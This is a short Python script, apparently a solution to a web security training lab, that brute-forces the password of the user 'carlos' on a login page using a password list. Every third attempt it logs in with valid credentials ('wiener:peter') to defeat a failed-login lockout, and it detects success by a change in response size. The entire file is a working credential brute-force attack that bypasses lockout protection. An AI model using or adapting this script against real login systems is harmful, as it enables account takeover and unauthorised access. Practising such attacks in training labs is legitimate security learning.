import requests
import time

# Replace with the URL you want to send the request to, should be end with /login
url = "https://www.example.com/login"

# save the passwords in a file called passwords.txt
file_path = 'passwords.txt'

# i is used as a counter so that a valid username and password are entered after two 
# invalid attepts
i=1

data = {
  'username': 'carlos',
  'password': '11'
}    
#The idea is compute the length of the response when the password is incorrect 
# and then save it in the variable invalid_password_output_size             
response = requests.post(url, data=data)
response_content = response.content
invalid_password_output_size = len(response_content)

# Open the file in read mode
with open(file_path, 'r') as file:
    # Read each line from the file
    for line in file:
        i=i+1
        if i%3==0 : 
          data = {
            'username': 'wiener',
            'password': 'peter'
          }
        else:
          password = line.strip()
          data = {
          'username': 'carlos',
          'password': password
          }      

        response = requests.post(url, data=data)
        response_content = response.content
        response_size = len(response_content)
        
        # if different size is found and this is not wiener user
        # then the password is correct and exit the loop
        if i%3!=0 and response_size!=invalid_password_output_size:
          print(password)
          break


